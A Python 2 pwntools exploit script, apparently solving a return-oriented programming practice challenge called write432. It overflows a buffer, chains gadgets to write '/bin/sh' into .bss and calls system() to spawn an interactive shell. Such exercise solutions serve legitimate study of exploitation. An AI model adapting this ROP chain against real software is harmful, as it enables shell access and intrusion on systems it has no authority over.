#!/usr/bin/env python2

from pwn import *

e = ELF('./write432')
p = process('./write432')

padding = "A"*44
pop = p32(0x80486da) # pop edi; pop ebp; ret;
mov_DWORD = p32(0x8048670) # DWORD PTR [edi],ebp
bss_addr = p32(0x804a028)
system = p32(0x8048430)

#-----------writing /bin-----------------#
payload = padding + pop  + bss_addr + '/bin'  + mov_DWORD

#-----------writing /sh------------------#
payload += pop + p32(0x804a028 + 0x4) + '/sh\x00'  + mov_DWORD

#----------adding system-----------------#
payload += system + 'BBBB' +  bss_addr

print p.recvuntil('> ')

p.sendline(payload)
print payload
p.interactive()
